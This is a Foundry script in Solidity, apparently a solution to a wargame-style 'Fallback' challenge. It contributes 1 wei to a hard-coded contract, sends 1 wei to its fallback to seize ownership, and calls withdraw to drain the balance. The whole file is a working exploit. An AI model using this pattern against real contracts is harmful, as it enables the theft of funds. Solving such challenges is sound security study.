// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
}

contract DeployFallback is Script{
    address private constant TARGET_ADDRESS = 0x4189a5D594E4e5547ad6bb804E2DFb3F59a688e4;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);

        IFallback target = IFallback(TARGET_ADDRESS);

        target.contribute{value: 1 wei}();
        address(target).call{value: 1 wei}("");

        target.withdraw();

        vm.stopBroadcast();
    } 
}